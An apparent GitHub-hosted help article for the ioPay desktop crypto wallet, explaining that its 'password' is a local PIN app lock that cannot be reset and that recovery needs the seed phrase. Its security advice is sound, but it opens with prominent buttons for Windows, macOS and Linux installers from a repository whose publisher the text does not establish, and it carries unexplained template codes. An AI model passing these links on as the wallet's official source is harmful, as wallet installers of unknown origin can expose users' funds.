![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Password Not Working? What the App Lock Actually Is

**There is no ioPay account and no login.** ioPay Wallet is a local application: your keys are stored on your machine, and what people call the "password" is the **app lock** - a PIN, with biometric unlock where the device supports it - sitting in front of that local store (F029).

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That one fact answers most of the questions on this page, including the hardest one: nobody can reset it for you, because nobody holds it.

## What the app lock protects

The lock protects **the app on this device**. Someone who picks up your unlocked laptop does not get straight into your funds, because the app asks for the PIN or a fingerprint first.

It does not protect:

- the account itself, if someone obtains your phrase;
- your funds if the device's disk is readable and the key material is extracted;
- anything at all if you forget the lock **and** have no backup.

If the worry is that a lock on a machine you own is not a strong enough boundary, the answer is not a longer PIN but keeping the key off the machine: [a hardware device](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/connecting-a-ledger-device-to-iopay-wallet.md) is that boundary, and the app lock still sits in front of it.

That is why the phrase is the backup and the PIN is not.

## "What happens if I lose my password?"

Q015, honestly: **you restore from your backup**, into a fresh install.

1. Install the current build.
2. Choose import.
3. Enter the **phrase** (or the private key / keystore, if that is what you have - three different artifacts, F050).
4. Confirm both addresses appear - the `io1...` and `0x...` forms.
5. Check balances and any staking positions, then back the account up again.

Nothing is damaged by this. The account was never in the app; the app was a window onto it. Losing the window and reopening it costs a few minutes and nothing else.

If you do **not** have the phrase or key, there is no path: no reset, no recovery service, and anyone offering one is asking for your phrase, which is the theft.

## "Can ioPay support recover my password?"

Q016: no. There is no support desk that holds credentials, because there are no credentials on a server. A local-first wallet deliberately has no mechanism to reset your access - that absence is the same property that stops a company from freezing your funds.

This is worth sitting with before you set the PIN: **the lock is not a recovery mechanism**, it is a convenience barrier.

## "Do I need an account and password to log in?"

Q063: no. There is no sign-up, no email, no password, no session. First launch asks you to set the app lock, and later launches ask you to pass it. Everything else is local.

If a website asks you to "log in to ioPay", it is not ioPay. There is nothing to log in to.

## If the PIN is rejected but looks right

- **Check the keyboard/layout** - a PIN typed on a different layout can be silently wrong.
- **Check biometrics** - a wet finger or a changed fingerprint enrolment can fail; fall back to the PIN.
- **Check you are on the current build** (v2.0.2); an old build's lock screen is a different build's behaviour.
- **Do not keep guessing.** Some locks escalate delay after repeated failures. If you have the phrase, [restoring](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/recover-a-locked-iopay-wallet-account.md) is faster and safer than a guessing game.

## The order of operations that avoids all of this

1. Create the wallet.
2. Write the phrase down, on paper.
3. Test a restore from that phrase.
4. Only then fund it, and only then set a PIN you will remember.

Backup first, lock second. [Backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).

## FAQ

**What happens if I lose my ioPay password?**
Restore from your phrase or key into a fresh install. The account is on-chain; the app lock is not the account.

**Can ioPay support recover my password?**
No. There is no server-side credential to reset.

**Do I need an account and password to log in to ioPay?**
No. There is no login. The PIN unlocks the local app.

**Is the PIN the same as my seed phrase?**
No. The PIN unlocks the app; the phrase recovers the account. Neither substitutes for the other.

**Can I change the PIN?**
Yes, from the app's settings, while you can still unlock it - which is another reason the phrase must exist independently.

## What the lock protects, mechanically

The app lock is a gate in front of a store, and the store's contents are protected by the operating system's keychain as well (F029). That layering explains the two things people find surprising.

**The lock belongs to the app, not to an account.** If you hold several accounts in one installation, unlocking the app is unlocking all of them; the lock is set for the app, not per account. The boundary the lock draws is between someone at your keyboard and everything the app can sign for.

**The keychain can prompt too.** On macOS and some Linux desktops the OS may ask for your login password when the app unlocks or when the lock is changed. That is the OS protecting the stored secret, not the wallet asking you to log in - and it is why "the app keeps asking for a password" is often a keychain question rather than an app-lock one.

## Moving the wallet to another machine

The lock does not travel. A new installation has its own, set on first run, and the account behind it is the one you import. That is the reason the phrase matters more than the PIN: the PIN is bound to one installation, and the account is bound to the key.


---

*App lock, keychain storage and biometrics follow the v2.0.2 build (F029); the three backup artifacts follow F050.*
